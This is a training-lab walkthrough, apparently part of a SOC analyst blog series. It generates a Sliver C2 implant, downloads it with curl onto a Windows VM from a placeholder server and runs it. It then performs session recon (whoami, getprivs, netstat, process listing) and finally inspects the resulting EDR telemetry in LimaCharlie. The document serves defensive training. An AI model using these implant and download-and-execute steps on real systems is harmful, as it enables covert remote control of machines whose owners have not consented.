# Part 2 - Observing Noise

### Blog Post: [So you want to be a SOC Analyst? Part 2](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-ea2)

Note: You will need to complete "Part 1 - Virtual Lab Setup" and have your Ubuntu Linux Server IP for this part of the walkthrough. 

## Generating C2 Payload

After either interacting with your Ubuntu Server or using a SSH session on your chosen Linux VM, you can become root and go to the Sliver install directory: 
```
sudo su
cd /opt/sliver
```

From there, you can launch Sliver Server with the following command:
```
sliver-server
```

If successful and everything has been installed correctly, you should recieve similar output: 

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/3f860d1c-7578-4ef7-903d-b43ee4ccbdae)

In the server session, we can generate our first C2 session payload (replacing "UbuntuIP" with our Ubuntu Server IP): 
```
generate --http <UbuntuIP> --save /opt/sliver
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/483ba814-d2a3-4759-8d84-cf464517ade9)

Confirm the new implant:
```
implants
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/0718a866-8ac4-4e80-87c5-18ba4edcfaad)

Now, after confirming the implant configuration and that our C2 payload is good to be transferred to the Windows VM, exit Sliver.
```
exit
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/a4eff8df-cf94-4869-89c0-c39ebfab1283)

Now, start a web server with python3 or any equivalent command:
```
python3 -m http.server 80
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/7b7bee52-6cc2-4d5e-ae43-4ea421840681)

Now, switch to our Windows VM. Using the following command (replacing "UbuntuIP" with our Ubuntu Server IP and replace "payload" with your C2 payload name), we can download the C2 payload from the Ubuntu Linux Server:
```
curl -o C:\Users\User\Downloads\<payload>.exe http://<UbuntuIP>/<payload>.exe
```

It should look similar to this, with your payload name and IP differing:
![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/4d0de454-69f6-4de2-a8e4-a0503e5647af)

We can also check to make sure that the payload downloaded properly by using the following command to see the contents of our current directory: 
```
dir
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/d3605fab-9c9d-438f-add2-749383d1e646)


## Start Command and Control Session
Returning to the Linux VM SSH session, we must enable the Sliver HTTP server to catch the callback.

Terminate the python web server we started using Ctrl + C

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/130a3c65-8585-47c3-a0e1-8fd6fa906044)

Now, relaunch the Sliver HTTP listener (You will often see #s in scripts as comments or notes to the user to help advise them, as shown below):
```
#First Command
sliver-server

#Second Command
http
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/0bd13753-bc46-41bb-90d8-f438e120bfee)

Return to the Windows VM and execute the C2 payload from its download directory (replacing the "C2-implant" with the payload name from earlier):
```
C:\Users\User\Downloads\<C2-implant>.exe
```

For example: 

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/fef8444d-9fb8-486e-99b5-6a2550c69e75)

If successful, we should see activity on the Sliver Server:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/55784ad5-1e60-4038-853b-d091117749ea)

Verify the session, cross referencing the Session ID found adjacent to "Session" or located below "ID":
```
sessions
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/94e6011b-41c7-4c9c-9418-01247c6c4927)

To interact with your new C2 session, use the following command:
```
use <session_id>
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/1b9ba9e0-f7ae-4f4f-975d-64ccf569f371)

Now interacting with the C2 session on the Windows VM, we will run a few basic commands.

Basic Info:
```
info
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/f62ade56-eace-4ab7-a30c-7f7a1f95f7b7)

User and Privileges:
```
#First Command
whoami

#Second Command
getprivs
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/603d8899-75b6-4e56-a509-76ed8e23d257)

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/96dc0246-d0fb-4b41-bcef-f40c610ed2fb)

Working Directory:
```
pwd
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/99fcfc2d-a551-47fe-bd10-55cd2f5abc79)

Network Connections:
```
netstat
```

Example of cropped output:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/64ec6144-5a51-4bc3-a336-538b0abac421)

We will also see our payload in green:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/18d8eae9-5e88-45f7-a6ae-247272d9913a)

Running Processes within a "Process Tree" format:
```
ps -T
```

Example of cropped output: 

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/f7e6bc58-637b-45a2-80c7-287c31c1d527)

As we can also see in this following example, defensive tools will be highlighted in red and mentioned in "Security Product(s)": 

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/10c5c9b5-25ae-4754-bc94-e4c220c5f797)

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/4b696bb0-afbc-4f72-aace-6b10c2b68831)

Likewise, our tools will once again be highlighted in green:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/52df3e2e-2e3f-47c8-847a-5d2e3b8f7bde)

## Observe EDR Telemetry

Switching to the LimaCharlie web UI, we can check out our sensors. We are looking for the windev2404eval sensor, as shown below:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/7fd71ff2-55f1-4221-91ea-b5fc3d871bb7)

After selecting the relevant sensor, we need to select "Processes" on the left-hand column:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/5cf84da5-0bb8-417f-9afd-2cb2aae975a5)

Feel free to explore the processes running. As stated in the blog series, a great way to spot unusual processes is to look for processes that are not signed (those lacking the green dot with a check mark).

For example, the C2 payload: 

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/b63bc1c7-0d79-466f-a17c-3cc8ac7ad5e0)

We can also view the network connections of said payload: 

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/6d30fabc-fd4b-4ee1-806d-6d4c1bed47fa)

This should show the connection to the Ubuntu server:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/4c80e8fa-eaf5-4114-b319-3b4a63173510)

Now, switch to the "Network" tab (located above the current Processes tab):

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/c2b6f514-dfa2-4bf3-8d9c-3ca6b8ebc90b)

After selecting the Network tab, Ctrl + F and type in your payload's name, example shown below:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/934ccceb-f620-4e56-b1b7-03091cab2023)

Now, switch to "File System", located above the "Network" tab:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/e65bbe48-3ed7-44d2-9ec8-7c11ffe940a5)

Browse to our payload's directory:
```
c:\Users\User\Downloads
```

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/6defd2db-e54d-4064-8b52-2431f191c332)

We can inspect our payload's file hash:

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/2e8b09b8-f9b1-4d06-a7ed-7508f487cd21)

As we do so, we will be given the option to "Search hash on VirusTotal". Click the button to do so. 

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/99ff1a00-841b-4320-8cda-0a6bb84f02c0)

After, we will see a message saying, "Item not found":

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/1abbd2f3-25d2-4219-9c7a-c42e98950247)

As the blog covers, just because an item is not found, does not mean it is not malicious. Because VirusTotal has multiple malicious scannings in its database, if something seems dangerous but isn't found, it is still a possibility that it poses some form of threat. 

Now, navigate to "Timeline", located below "File System":

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/265bcecf-9d5a-46d6-bd5c-a336c985fdf4)

The Timeline shows a "near real-time view of EDR telemetry + event logs"

Below is an excerpt of our own timeline, with our payload's name to the right.

![image](https://github.com/Virtual-Watcher/SOC-Analyst-Walkthrough/assets/171607952/e3b2bc7f-2b6f-4531-a454-e13706240faf)

Likewise, if you search through the timeline, you can find where your own payload began next to "NEW_DOCUMENT" or "NEW_PROCESS".

We will continue by mimicking the actions of an attacker, next time in Part 3 - Emulating an Adversary!
